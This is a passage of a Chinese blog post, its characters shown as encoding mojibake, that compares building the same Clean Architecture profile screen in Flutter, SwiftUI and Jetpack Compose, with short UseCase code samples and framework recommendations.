<p>è¿˜è®°å¾—å’±ä»¬ä»¥å‰è€æ˜¯ä¸ºâ€œå“ªç§æ¡†æ¶æ‰æ˜¯å åŠçš„â€åµå¾—ä¸å¯å¼€äº¤å—ï¼Ÿè¿™å›ï¼Œæˆ‘ç»ˆäºå¹²äº†ä»¶æ¯ä¸ªå¼€å‘è€…éƒ½æ”¾è¿‡ç‹ è¯ã€ä½†ä»æ¥æ²¡çœŸå¹²è¿‡çš„äº‹ï¼šæˆ‘ç”¨ <strong>Flutterã€SwiftUI å’Œ Jetpack Compose</strong> æŠŠåŒä¸€ä¸ªç•Œé¢æ’¸äº†å‡ºæ¥â€”â€”è€Œä¸”å…¨éƒ½ä¸¥æ ¼éµå¾ªäº† <strong>Clean Architectureï¼ˆæ•´æ´æ¶æ„ï¼‰</strong> åŸåˆ™ã€‚</p>
<p><strong>æ¬¢è¿å…³æ³¨æˆ‘çš„å¾®ä¿¡å…¬ä¼—å·ï¼šOpenFlutter</strong></p>
<p>è¯´å®è¯ï¼Œæœ€åçš„ç»“æœçœŸæŠŠæˆ‘ç»™æƒŠåˆ°äº†ã€‚</p>
<h4 data-id="heading-0">ä¸ºä»€ä¹ˆè¿™ç¯‡æ–‡ç« å€¼å¾—ä½ çœ‹ï¼ˆæ²¡é”™ï¼Œè¯´çš„å°±æ˜¯ä½ ï¼‰</h4>
<p>å¬ç€ï¼Œæˆ‘æ‡‚ã€‚ä½ ç‚¹è¿›æ¥å¤šåŠæ˜¯å› ä¸ºï¼š</p>
<ul>
<li>ä½ æ­£é™·å…¥â€œæ¡†æ¶ç„¦è™‘ï¼ˆFOMOï¼‰â€ä¸­ï¼Œæ€¥éœ€å®šå¤º<strong>åˆ°åº•å­¦å“ªä¸€ä¸ª</strong>ï¼›</li>
<li>è€æ¿é—®ä½ â€œå’±ä»¬é¡¹ç›®ç”¨å“ªä¸ªå¥½ï¼Ÿâ€ï¼Œä½ å½“æ—¶å°±<strong>æ…Œäº†</strong>ï¼›</li>
<li>ä½ æ˜¯ä¸ª Flutter å¼€å‘è€…ï¼Œæ€»æƒ¦è®°ç€<strong>éš”å£çš„è‰æ˜¯ä¸æ˜¯æ›´ç»¿ä¸€äº›</strong>ï¼›</li>
<li>ä½ è¦å»é¢è¯•äº†ï¼Œæƒ³åœ¨èŠè·¨å¹³å°å¼€å‘æ—¶æ˜¾å¾—<strong>æ›´æœ‰æ·±åº¦</strong>ï¼›</li>
<li>ä½ å¿ƒé‡Œå…¶å®å·²ç»é€‰å¥½äº†ï¼Œå°±æŒ‡æœ›æˆ‘èƒ½<strong>å¤¸å¤¸ä½ çš„é€‰æ‹©</strong>ï¼ˆå‰§é€ä¸€ä¸‹ï¼šæ²¡å‡†å„¿çœŸä¼šå“¦ï¼‰ã€‚</li>
</ul>
<p>ä¸ç®¡ä½ æ˜¯ä¸ºäº†å•¥æ¥çš„ï¼Œæˆ‘ä¿è¯è¿™ä¸æ˜¯é‚£ç§â€œHello Worldâ€çº§åˆ«çš„æµæ°´è´¦ã€‚è¿™æ˜¯ä¸€ä¸ªåˆšç†¬äº†ä¸‰ä¸ªé€šå®µï¼Œåœ¨çŠ¶æ€ç®¡ç†ã€ä¾èµ–æ³¨å…¥ä»¥åŠâ€œç­‰ç­‰ï¼Œæˆ‘è¿™å±‚æ•°æ®åˆ°åº•æ€ä¹ˆä¼ ç»™ä¸‹ä¸€å±‚æ¥ç€ï¼Ÿâ€è¿™äº›åœ°ç‹±çº§éš¾é¢˜é‡Œåå¤æ¨ªè·³åçš„<strong>çœŸå®æ„Ÿæ‚Ÿ</strong>ã€‚</p>
<h4 data-id="heading-1">ç»ˆææŒ‘æˆ˜ï¼šä¸€ä¸ªç•Œé¢ï¼Œä¸‰å¥—æ¡†æ¶ï¼Œæ‹’ç»å€Ÿå£</h4>
<p>æˆ‘åšçš„æ˜¯ä¸€ä¸ªå®æˆ˜çº§åˆ«çš„â€œç”¨æˆ·ä¸ªäººèµ„æ–™â€é¡µé¢ï¼Œæ¯•ç«Ÿç°åœ¨è°è¿˜ç¨€ç½•çœ‹è®¡æ•°å™¨ï¼ˆCounter Appï¼‰å•Šï¼Ÿè¿™ç©æ„å„¿åŒ…å«äº†ï¼š</p>
<ul>
<li><strong>çœŸå®çš„è¿œç¨‹ API è°ƒç”¨</strong>ï¼ˆå¸¦æŠ¥é”™å¤„ç†çš„é‚£ç§ï¼‰ï¼›</li>
<li><strong>çœŸæ­£ç®¡ç”¨çš„æœ¬åœ°ç¼“å­˜</strong>ï¼›</li>
<li><strong>ä¸è‡³äºä¸‘å¾—åƒåƒåœ¾ä¸€æ ·çš„åŠ è½½çŠ¶æ€</strong>ï¼›</li>
<li><strong>ä¸¥è°¨çš„ Clean Architecture åˆ’åˆ†</strong>ï¼ˆUseCases, Repositoriesï¼Œä¸€ä¸ªéƒ½ä¸å°‘ï¼‰ï¼›</li>
<li><strong>ä¸ä¼šè®©ä½ æƒ³æ‘”ç”µè„‘çš„è·¯ç”±å¯¼èˆª</strong>ã€‚</li>
</ul>
<p>åŒæ ·çš„è®¾è®¡ï¼ŒåŒæ ·çš„æ¶æ„ï¼ŒåŒæ ·çš„åŠŸèƒ½ã€‚ä½†å®ç°å®ƒçš„è¿‡ç¨‹ï¼Œå´æ˜¯ä¸‰ç§æˆªç„¶ä¸åŒçš„ä½“éªŒã€‚</p>
<hr/>
<h3 data-id="heading-2">æˆ‘çš„å®æµ‹ä½“ä¼šï¼ˆé‚£äº›å®˜å®£é‡Œä¸ä¼šå‘Šè¯‰ä½ çš„äº‹ï¼‰</h3>
<h4 data-id="heading-3">1. Flutterï¼šçœŸé¦™ï¼Œå®ƒæ˜¯çœŸçš„èƒ½å¹²æ´»</h4>
<p>Flutter æœ€è®©æˆ‘æ„Ÿåˆ°è«åçš„çˆ½æ„Ÿçš„ä¸€ç‚¹æ˜¯ï¼šå®ƒå±…ç„¶â€¦çœŸçš„èƒ½è·‘ï¼Ÿè€Œä¸”æ˜¯å“ªå„¿éƒ½èƒ½è·‘ã€‚</p>
<p>æˆ‘åªå†™äº†ä¸€å¥—ä»£ç ï¼Œå®ƒå°±èƒ½å®Œç¾è¿è¡Œåœ¨æˆ‘çš„ iPhoneã€å®‰å“æµ‹è¯•æœºï¼Œ<strong>ç”šè‡³</strong>æ˜¯ç½‘é¡µæµè§ˆå™¨ä¸Šï¼Œè€Œä¸”æˆ‘è¿˜æ²¡ç»™ç¼–è¯‘å™¨å¤§ç¥â€œçƒ§é¦™â€ã€‚å®ƒçš„ <strong>Hot Reloadï¼ˆçƒ­é‡è½½ï¼‰</strong> å¿«åˆ°ç¦»è°±ï¼Œåˆšå¼€å§‹æˆ‘ç”šè‡³ä»¥ä¸ºå®ƒåäº†â€”â€”æŒ‰ä¸‹ä¿å­˜ï¼Œä¿®æ”¹ç«‹ç°ã€‚æ²¡æœ‰ç¼–è¯‘ç­‰å¾…ï¼Œæ²¡æœ‰æ¼«é•¿åŠ è½½ã€‚è¿™ç§ç”Ÿäº§åŠ›ï¼Œç®€ç›´æ˜¯çº¯ç²¹çš„äº«å—ã€‚</p>
<p>Clean Architecture çš„æ­å»ºè¿‡ç¨‹ä¹Ÿæ„å¤–åœ°é¡ºæ»‘ã€‚ç”¨ <code>get_it</code> åšä¾èµ–æ³¨å…¥ï¼Ÿç®€ç›´<strong>ç»äº†ï¼ˆChef's kissï¼‰</strong> ã€‚è¿™ç§ç›®å½•ç»“æ„è®©ä½ è§‰å¾—ï¼Œè¿™æ¡†æ¶çš„è®¾è®¡è€…æ˜¯çœŸçš„è€ƒè™‘è¿‡å¼€å‘è€…çš„å¿ƒè·¯å†ç¨‹çš„ã€‚</p>
<p><strong>ä½†åè½¬æ¥äº†ï¼š</strong> Dart è¿™é—¨è¯­è¨€æœ‰ç‚¹æ€ªã€‚å®ƒä¸å·®ï¼Œåªæ˜¯â€¦å¼‚ç±»ã€‚å¦‚æœä½ ä¹ æƒ¯äº† Kotlin æˆ– Swiftï¼Œä½ å¤´ä¸€å‘¨è‚¯å®šä¼šåå¤çº ç»“ï¼šâ€œä¸ºä»€ä¹ˆè¿™å„¿è¦å†™ä¸‹åˆ’çº¿ï¼Ÿâ€ä»¥åŠâ€œè¿™ä¸ª <code>late</code> å…³é”®å­—åˆ°åº•æ˜¯ä¸ªä»€ä¹ˆé¬¼ï¼Ÿâ€</p>
<h4 data-id="heading-4">2. SwiftUIï¼šæœç²‰çš„å¿«ä¹ï¼ˆä½†ä»…é™æœç²‰ï¼‰</h4>
<p>ç”¨ SwiftUI å¼€å‘å°±åƒå¼€ç‰¹æ–¯æ‹‰ï¼šé¡ºæ»‘ã€æå…·æœªæ¥æ„Ÿï¼Œä½†ä¸€æ—¦ä½ ç¦»å¼€äº†å®ƒçš„ç”Ÿæ€åœˆï¼Œå¶å°”ä¼šè§‰å¾—å¿ƒç´¯ã€‚</p>
<p>å®ƒçš„å£°æ˜å¼è¯­æ³•<strong>å¤ªæ¼‚äº®äº†</strong>ã€‚çœŸçš„ï¼Œå†™ä¸‹ <code>@State</code> ç„¶åçœ‹ç€ UI è‡ªåŠ¨æ›´æ–°ï¼Œç®€ç›´åƒåœ¨æ–½é­”æ³•ã€‚é‚£ç§åªåŠ ä¸€ä¸ª <code>.animation()</code> å°±èƒ½æå®šåŠ¨ç”»çš„æ„Ÿè§‰ï¼Ÿå‡Œæ™¨ä¸¤ç‚¹ï¼Œæˆ‘åœ¨ç©ºæ— ä¸€äººçš„å…¬å¯“é‡Œå¿ä¸ä½å«äº†å£°â€œå“‡å¡â€ã€‚</p>
<p>ä½†åœ¨ SwiftUI é‡Œæ Clean Architectureï¼Œäº‹æƒ…å°±å¼€å§‹å˜å¾—â€œå¤æ‚â€äº†ã€‚SwiftUI å¼ºè¿«ä½ ç”¨ Combine æˆ– async/awaitï¼ˆè¿™æœ¬èº«æŒºå¥½ï¼‰ï¼Œä½†ç´§æ¥ç€ä½ å°±è¦å¤„ç†å„ç§ Publishers å’Œ Cancellablesï¼Œæå¾—ä½ çš„ ViewModel çœ‹èµ·æ¥åƒé£èˆ¹ä»ªè¡¨ç›˜ä¸€æ ·ã€‚</p>
<p><strong>æœ€æ‰å¿ƒçš„ä¸€ç‚¹ï¼Ÿ</strong> ä»…é™ iOSï¼ˆè¡Œå§ï¼Œè¿˜æœ‰ macOS å’Œ watchOSï¼Œä½†ä½ æ‡‚æˆ‘æ„æ€ï¼‰ã€‚ä½ é‚£ä¸€å¥—æ¼‚äº®çš„ä»£ç åªèƒ½ç•™åœ¨è‹¹æœçš„â€œåèŠ±å›­â€é‡Œã€‚æ²¡å®‰å“ï¼Œæ²¡ç½‘é¡µã€‚æœ‰çš„åªæ˜¯ä¼˜é›…çš„æ ¼è°ƒå’Œé«˜è€¸çš„å›´å¢™ã€‚</p>
<h4 data-id="heading-5">3. Jetpack Composeï¼šå®‰å“å¼€å‘è€…çš„â€œæ•‘èµä¹‹è·¯â€</h4>
<p>å¦‚æœä½ æ›¾æ·±å— XML å¸ƒå±€çš„æŠ˜ç£¨ï¼Œé‚£ Compose å°±åƒæ˜¯æ²™æ¼ é‡Œçš„ç”˜éœ²ã€‚Google ç»ˆäºææ¸…æ¥šå¼€å‘è€…åˆ°åº•æƒ³è¦ä»€ä¹ˆäº†ã€‚</p>
<p><code>Composable</code> å‡½æ•°å†™èµ·æ¥ç›´è§‚å¾—ä¸€å¡Œç³Šæ¶‚ã€‚å…¨æ˜¯ Kotlinï¼Œè¿™æ„å‘³ç€å¦‚æœä½ æ‡‚ Kotlinï¼Œä½ å°±å·²ç»æŒæ¡äº† 70%ã€‚é¢„è§ˆç³»ç»Ÿä¹Ÿå¾ˆç¨³ï¼ˆå‰ææ˜¯ Android Studio å†³å®šé…åˆä½ ï¼Œä¸è¿‡ç»å¤§å¤šæ•°æ—¶å€™å®ƒè¿˜æŒºä¹–ï¼‰ã€‚</p>
<p><strong>Clean Architecture å®ç°ï¼Ÿ</strong> ç¡®å®å¾ˆå¹²å‡€ã€‚Kotlin çš„åç¨‹ï¼ˆCoroutinesï¼‰è®©å¼‚æ­¥æ“ä½œå˜å¾—éå¸¸è‡ªç„¶ã€‚ç”¨ Hilt åšä¾èµ–æ³¨å…¥çš„é›†æˆæå…¶ä¸æ»‘ï¼Œä½ ä¼šçº³é—· Google ä¸ºä»€ä¹ˆèŠ±äº†è¿™ä¹ˆå¤šå¹´æ‰å¼€çªã€‚</p>
<p><strong>ä½†é‚£å¤´â€œæˆ¿é—´é‡Œçš„å¤§è±¡â€ä¾ç„¶å­˜åœ¨ï¼š</strong> å®ƒç›®å‰åŸºæœ¬åªå±äºå®‰å“ã€‚è™½ç„¶ Compose Multiplatform å·²ç»å‡ºæ¥äº†ï¼Œä½†å’±ä»¬è¯´å®è¯â€”â€”å®ƒè¿˜æ²¡åˆ°é‚£ç§è°éƒ½èƒ½ç›´æ¥æ‹¿æ¥è·‘ç”Ÿäº§ç¯å¢ƒçš„ç¨‹åº¦ã€‚ä½ ç°åœ¨å…¥å‘ï¼ŒèµŒçš„æ˜¯æœªæ¥ã€‚</p>
<hr/>
<h3 data-id="heading-6">ä»£ç å¤§å¯¹å†³ï¼ˆåŠ¨çœŸæ ¼çš„äº†ï¼‰</h3>
<p>æ¥çœ‹çœ‹è¿™æ®µè®©æˆ‘ç›´å‘¼â€œå¥½å®¶ä¼™â€çš„éƒ¨åˆ†ï¼šåœ¨ä¸‰å¥—æ¡†æ¶é‡Œåˆ†åˆ«å®ç°åŒä¸€ä¸ª UseCaseã€‚</p>
<p><strong>Flutter (Dart)ï¼š</strong></p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetUserProfileUseCase</span> </span>{
  <span class="hljs-keyword">final</span> UserRepository repository;
  
  GetUserProfileUseCase(<span class="hljs-keyword">this</span>.repository);
  
  Future&lt;Result&lt;UserProfile&gt;&gt; call(<span class="hljs-built_in">String</span> userId) <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> repository.getUserProfile(userId);
  }
}
</code></pre>
<p><strong>ä»£ç ç‚¹è¯„ï¼š</strong> å¹²å‡€ã€ç®€æ´ã€å¼‚æ­¥ä¼˜å…ˆã€‚è¿™ä¸ª <code>call()</code> æ–¹æ³•æ„å‘³ç€ä½ å¯ä»¥åƒè°ƒç”¨å‡½æ•°ä¸€æ ·ç›´æ¥è¿è¡Œå®ƒã€‚è¿™å°±æ˜¯å…¸å‹çš„ Dart èŒƒå„¿ï¼ˆDart vibesï¼‰ã€‚</p>
<p><strong>SwiftUI (Swift)ï¼š</strong></p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">protocol</span> <span class="hljs-title class_">GetUserProfileUseCase</span> {
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">execute</span>(<span class="hljs-params">userId</span>: <span class="hljs-type">String</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> -&gt; <span class="hljs-type">UserProfile</span>
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">GetUserProfileUseCaseImpl</span>: <span class="hljs-title class_">GetUserProfileUseCase</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> repository: <span class="hljs-type">UserRepository</span>
    
    <span class="hljs-keyword">init</span>(<span class="hljs-params">repository</span>: <span class="hljs-type">UserRepository</span>) {
        <span class="hljs-keyword">self</span>.repository <span class="hljs-operator">=</span> repository
    }
    
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">execute</span>(<span class="hljs-params">userId</span>: <span class="hljs-type">String</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> -&gt; <span class="hljs-type">UserProfile</span> {
        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> repository.getUserProfile(userId: userId)
    }
}
</code></pre>
<p>è¿™ä¸ª <code>async throws</code> å†™æ³•ç®€ç›´ç¾å¦‚ç”»ã€‚Swift çš„ç±»å‹å®‰å…¨æœºåˆ¶å¼ºå¾—æƒŠäººï¼Œä½†åŒæ—¶ä¹Ÿæ„å‘³ç€ä¼šæœ‰æ›´å¤šæ¨¡æ¿ä»£ç ï¼ˆBoilerplateï¼‰ã€‚å°±çœ‹ä½ æ›´ä¸­æ„å“ªä¸€ä¸ªäº†ï¼ˆPick your poisonï¼‰ã€‚</p>
<p><strong>Compose (Kotlin)ï¼š</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">GetUserProfileUseCase</span> <span class="hljs-meta">@Inject</span> <span class="hljs-keyword">constructor</span>(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> repository: UserRepository
) {
    <span class="hljs-keyword">suspend</span> <span class="hljs-keyword">operator</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">invoke</span><span class="hljs-params">(userId: <span class="hljs-type">String</span>)</span></span>: Result&lt;UserProfile&gt; {
        <span class="hljs-keyword">return</span> repository.getUserProfile(userId)
    }
}
</code></pre>
<p>é‚£ä¸ª <code>operator fun invoke</code>ï¼Ÿç®€ç›´æ˜¯<strong>ç¥æ¥ä¹‹ç¬”ï¼ˆChef's kissï¼‰</strong> ã€‚Kotlin çš„ç®€æ´æ€§è®©æˆ‘çš„å¤§è„‘æå…¶èˆ’é€‚ã€‚å†åŠ ä¸Š Hilt çš„ <code>@Inject</code>ï¼Œä¾èµ–æ³¨å…¥è¿™ä»¶äº‹å˜å¾—åƒå‘¼å¸ä¸€æ ·è‡ªç„¶ã€‚</p>
<h4 data-id="heading-7">è¯šå®è±†æ²™åŒ…ï¼šåˆ°åº•ä»€ä¹ˆæ‰é‡è¦ï¼Ÿ</h4>
<p>åœ¨æŠŠåŒä¸€ä¸ªåŠŸèƒ½å†™äº†ä¸‰éä¹‹åï¼Œæˆ‘æ€»ç»“å‡ºäº†ä¸€äº›èƒ½çœŸæ­£å¸®ä½ åšå†³å®šçš„å»ºè®®ï¼š</p>
<ul>
<li>
<p><strong>é€‰ Flutterï¼Œå¦‚æœï¼š</strong></p>
<ul>
<li>ä½ éœ€è¦å¿«é€Ÿæ¨å‘å¤šä¸ªå¹³å°ã€‚</li>
<li>ä½ çš„å›¢é˜Ÿæ‡‚ Dartï¼ˆæˆ–è€…æ„¿æ„å­¦ç‚¹æ–°ä¸œè¥¿ï¼‰ã€‚</li>
<li>ä½ æŠŠå¼€å‘ä½“éªŒå’Œçƒ­é‡è½½ï¼ˆHot Reloadï¼‰çœ‹ä½œç”Ÿå‘½çº¿ã€‚</li>
<li>ä½ åœ¨æåˆ›ä¸šï¼Œæ¨ä¸å¾—æ˜¨å¤©å°±èƒ½æŠŠ iOS + å®‰å“ + Web ç‰ˆå…¨ä¸Šçº¿ã€‚</li>
<li>ä½ ä¸ä»‹æ„ Dart çš„ç”Ÿæ€æ²¡æœ‰ Swift/Kotlin é‚£ä¹ˆâ€œå›½æ°‘çº§â€ã€‚</li>
</ul>
</li>
<li>
<p><strong>é€‰ SwiftUIï¼Œå¦‚æœï¼š</strong></p>
<ul>
<li>ä½ åªæ‰“ç®—åœ¨è‹¹æœçš„ç”Ÿæ€é‡Œæ··ã€‚</li>
<li>ä½ è¿½æ±‚æè‡´çš„ iOS åŸç”Ÿè´¨æ„Ÿå’Œæ€§èƒ½ã€‚</li>
<li>ä½ çš„å›¢é˜Ÿå·²ç»æ˜¯ Swift è€æ‰‹äº†ã€‚</li>
<li>ä½ çˆ±â€œç±»å‹å®‰å…¨â€èƒœè¿‡çˆ±ä½ çš„å®¶äººã€‚</li>
<li>ä½ èƒ½æ¥å—æœ€ä½ç³»ç»Ÿè¦æ±‚æ˜¯ iOS 14+ï¼ˆé‚£äº›è€æœºå‹ç”¨æˆ·åªèƒ½è¯´å£°æŠ±æ­‰äº†ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>é€‰ Composeï¼Œå¦‚æœï¼š</strong></p>
<ul>
<li>ä½ æ˜¯å®‰å“ä¼˜å…ˆï¼ˆæˆ–è€…ç›®å‰åªåšå®‰å“ï¼‰ã€‚</li>
<li>ä½ çš„å›¢é˜Ÿæ˜¯ Kotlin æ­»å¿ ç²‰ã€‚</li>
<li>ä½ æƒ³é€ƒç¦» XML å¸ƒå±€çš„â€œåˆ›ä¼¤â€ï¼Œæ‹¥æŠ±ç°ä»£å®‰å“å¼€å‘ã€‚</li>
<li>ä½ æ„¿æ„åœ¨ Compose Multiplatform çš„æœªæ¥ä¸ŠèµŒä¸€æŠŠã€‚</li>
<li>ä½ éå¸¸å¿ƒæ°´ Material Design 3 é‚£ç§ä¸æ»‘çš„é›†æˆæ„Ÿã€‚</li>
</ul>
</li>
</ul>
<h4 data-id="heading-8">èŠèŠæ€§èƒ½ï¼ˆæ¯•ç«Ÿæ€»æœ‰äººçˆ±é—®è¿™ä¸ªï¼‰</h4>
<p>è¯´å¥å®åœ¨è¯ï¼š<strong>å¯¹äº 90% çš„åº”ç”¨æ¥è¯´ï¼Œæ€§èƒ½å·®å¼‚å‡ ä¹å¯ä»¥å¿½ç•¥ä¸è®¡ã€‚</strong> ä½ çš„ç”¨æˆ·å‘ç°ä¸äº†ï¼Œä½ çš„è€æ¿å‘ç°ä¸äº†ã€‚ç”šè‡³ä½ è‡ªå·±ä¹Ÿå‘ç°ä¸äº†â€”â€”é™¤éä½ åœ¨å†™ä»€ä¹ˆæå…¶å¤æ‚çš„ç©æ„å„¿ã€‚</p>
<p>ä½†æ—¢ç„¶è¦æ¯”ï¼Œé‚£å°±æ‹†å¼€è¯´ï¼š</p>
<ul>
<li><strong>Flutterï¼š</strong> ç¼–è¯‘æˆåŸç”Ÿä»£ç ã€‚å¿«ï¼Œä¸æ»‘çš„ 60fpsã€‚Skia æ¸²æŸ“å¼•æ“å·²ç»ç»å—äº†æ—¶é—´çš„è€ƒéªŒã€‚</li>
<li><strong>SwiftUIï¼š</strong> iOS äº²å„¿å­ã€‚å¿«ã€‚æœ‰æ—¶å€™åœ¨ä¼˜åŒ–ä¸Šæ˜¾å¾—â€œèªæ˜è¿‡å¤´â€äº†ï¼ˆæ²¡é”™ï¼Œè¯´çš„å°±æ˜¯é‚£äº›ç¥ç§˜çš„è§†å›¾æ›´æ–°é€»è¾‘ï¼‰ã€‚</li>
<li><strong>Composeï¼š</strong> å®‰å“äº²å„¿å­ã€‚å¿«ã€‚Kotlin çš„è¿è¡Œæ—¶å·²ç»éå¸¸æˆç†Ÿä¸”ç»è¿‡æ·±åº¦ä¼˜åŒ–ã€‚ <strong>çœŸæ­£çš„æ€§èƒ½ç“¶é¢ˆé€šå¸¸å‡ºåœ¨ä½ çš„ä»£ç ä¸Šï¼Œè€Œä¸æ˜¯æ¡†æ¶ã€‚</strong> å¾ˆæ‰å¿ƒï¼Œä½†è¿™æ˜¯äº‹å®ã€‚</li>
</ul>
<h4 data-id="heading-9">å¼€å‘ä½“éªŒï¼ˆDXï¼‰çš„çœŸç›¸</h4>
<p>æœ‰ä¸€ç‚¹æ²¡äººä¼šå‘Šè¯‰ä½ ï¼šå¯¹äºå¤§å¤šæ•°é¡¹ç›®æ¥è¯´ï¼Œ<strong>å¼€å‘ä½“éªŒï¼ˆDXï¼‰æ¯”åŸå§‹æ€§èƒ½æ›´é‡è¦ã€‚</strong></p>
<ul>
<li><strong>Flutter èµ¢åœ¨ï¼š</strong> çƒ­é‡è½½é€Ÿåº¦ï¼ˆçœŸçš„ï¼Œå¿«åˆ°æ²¡æœ‹å‹ï¼‰ã€è·¨å¹³å°çš„ä¸€è‡´æ€§ã€æå…¶ä¸°å¯Œçš„æ’ä»¶ç”Ÿæ€ï¼ˆpub.dev æ˜¯åº§å®åº“ï¼‰ã€æ–‡æ¡£è´¨é‡ï¼ˆFlutter çš„æ–‡æ¡£å ªç§°è¡Œä¸šæ ‡æ†ï¼‰ã€‚</li>
<li><strong>SwiftUI èµ¢åœ¨ï¼š</strong> IDE é›†æˆåº¦ï¼ˆXcode è™½æœ‰æ§½ç‚¹ï¼Œä½†å®ƒæ˜¯ä¸º Swift è€Œç”Ÿçš„ï¼‰ã€ç±»å‹å®‰å…¨å’Œç¼–è¯‘æ—¶çº é”™ã€Xcode Previews é¢„è§ˆï¼ˆåªè¦å®ƒä¸æŠ½é£ï¼‰ã€‚</li>
<li><strong>Compose èµ¢åœ¨ï¼š</strong> Kotlin å¼ºå¤§çš„è¯­è¨€ç‰¹æ€§ã€Android Studio çš„æ·±åº¦æ•´åˆã€Material Design çš„å®˜æ–¹å®ç°ã€ä»¥åŠé‚£ç§â€œç»ˆäºæ°¸è¿œåˆ æ‰ XML æ–‡ä»¶â€çš„è§£è„±æ„Ÿã€‚</li>
</ul>
<h4 data-id="heading-10">ç¤¾åŒºç°çŠ¶ï¼ˆè¿™å…³ä¹ä½ çš„é¥­ç¢—ï¼‰</h4>
<p>èŠèŠæ‰¾å·¥ä½œå’Œç¤¾åŒºï¼Œæ¯•ç«Ÿå¤§å®¶éƒ½è¦åƒé¥­ï¼š</p>
<ul>
<li><strong>Flutter å²—ä½ï¼š</strong> å¢é•¿æå¿«ã€‚åˆåˆ›å…¬å¸æœ€çˆ±ï¼Œå¤§å‚ä¹Ÿåœ¨è§‚æœ›ã€‚ç¤¾åŒºæå…¶æ´»è·ƒä¸”ä¹äºåŠ©äººã€‚FlutterFlow ç”šè‡³è®©å¾ˆå¤šä¸å†™ä»£ç çš„äººä¹Ÿå¼€å§‹å…¥å‘äº†ã€‚</li>
<li><strong>SwiftUI å²—ä½ï¼š</strong> åœ¨ä¸“æ³¨äºè‹¹æœç”Ÿæ€çš„å…¬å¸é‡Œéå¸¸ç¨³ã€‚æƒ³è¿›å¤§å‚åš iOSï¼ŒSwiftUI æ˜¯å¿…ä¿®è¯¾ã€‚è–ªèµ„æ™®éåé«˜ï¼Œå› ä¸º iOS å¼€å‘ä¸€ç›´è‡ªå¸¦æº¢ä»·ã€‚</li>
<li><strong>Compose å²—ä½ï¼š</strong> ç°åœ¨çš„å®‰å“å²—ä½å‡ ä¹éƒ½è¦æ±‚ä¼š Composeã€‚å¦‚æœä½ ç²¾é€š Composeï¼Œä½ å°±æ˜¯å®‰å“èŒåœºä¸Šçš„â€œç‹¬è§’å…½â€ã€‚å„å®¶å…¬å¸éƒ½åœ¨ä» XML è¿ç§»ï¼Œæ€¥éœ€å¤§è…¿ã€‚</li>
</ul>
<h4 data-id="heading-11">æˆ‘çš„çœŸå¿ƒæ¨èï¼ˆæˆ‘çŸ¥é“ä½ ä»¬éƒ½åœ¨ç­‰è¿™ä¸€æ®µï¼‰</h4>
<p>å¦‚æœæ˜å¤©è¦å¼€ä¸ªæ–°é¡¹ç›®ï¼Œåªèƒ½<strong>é€‰ä¸€ä¸ª</strong>ï¼Ÿ</p>
<p><strong>æˆ‘ä¼šé€‰ Flutterã€‚</strong> åœ¨ SwiftUI/Compose çš„ç²‰ä¸å¼€å–·ä¹‹å‰ï¼Œå¬æˆ‘è§£é‡Šï¼š ä¸€å¥—ä»£ç æå®š iOSã€å®‰å“å’Œ Webï¼Œè¿™ä¸ªä»·å€¼å®åœ¨å¤ªè¯±äººäº†ã€‚å®ƒçš„å¼€å‘ä½“éªŒå§‹ç»ˆå¦‚ä¸€åœ°å‡ºè‰²ï¼Œç¤¾åŒºå……æ»¡æ´»åŠ›ï¼Œæ’ä»¶ç”Ÿæ€ä¹Ÿå·²ç»ç†Ÿé€äº†ã€‚è¯´çœŸçš„ï¼Œå…‰æ˜¯ä¸€ä¸ªâ€œçƒ­é‡è½½â€çœä¸‹æ¥çš„æ—¶é—´ï¼Œå°±è¶³ä»¥æŠµæ¶ˆå­¦ä¹  Dart çš„æˆæœ¬äº†ã€‚</p>
<p><strong>ä½†æ˜¯ï¼ˆåˆ’é‡ç‚¹ï¼‰ï¼š</strong></p>
<ul>
<li>å¦‚æœä½ <strong>åªç»™ iOS å†™ App</strong>ï¼Ÿé€‰ SwiftUIï¼Œåˆ«çŠ¹è±«ã€‚</li>
<li>å¦‚æœä½ <strong>åªç»™å®‰å“å†™ App</strong>ï¼Ÿé€‰ Composeï¼Œå†²å°±å®Œäº†ã€‚</li>
<li>å¦‚æœä½ æ˜¯åœ¨<strong>ç°æœ‰çš„åŸç”Ÿ App</strong> ä¸Šä¿®ä¿®è¡¥è¡¥ï¼Ÿè€è€å®å®å®ˆç€åŸæœ‰çš„æŠ€æœ¯æ ˆã€‚</li>
</ul>
<h4 data-id="heading-12">å…³äºæ¶æ„çš„æƒŠå–œ</h4>
<p>æœ‰ä¸€ç‚¹æŒºå‡ºä¹æ„æ–™ï¼š<strong>Clean Architecture åœ¨ Kotlin/Compose é‡Œæ„Ÿè§‰æœ€è‡ªç„¶ã€‚</strong> Kotlin çš„è¯­è¨€ç‰¹æ€§ï¼ˆå¯†å°ç±»ã€åç¨‹ã€æ•°æ®ç±»ï¼‰è·Ÿæ•´æ´æ¶æ„åŸåˆ™ç®€ç›´æ˜¯å¤©ä½œä¹‹åˆã€‚Flutter ç´§éšå…¶åã€‚è€Œ SwiftUI åˆ™éœ€è¦ä½ è·Ÿåè®®ï¼ˆProtocolsï¼‰å’Œç±»å‹ç³»ç»Ÿè¿›è¡Œæœ€å¤šçš„â€œææ–—â€ã€‚ ä½†æ ¸å¿ƒç»“è®ºæ˜¯ï¼š<strong>è¿™ä¸‰è€…éƒ½èƒ½å®Œç¾é€‚é…æ¶æ„ã€‚</strong> è¿™ç§åŸåˆ™æ˜¯è¶…è¶Šæ¡†æ¶çš„ï¼Œä¸ç®¡ä½ å†™çš„æ˜¯ Dartã€Swift è¿˜æ˜¯ Kotlinï¼Œä½ çš„é¢†åŸŸå±‚ï¼ˆDomain 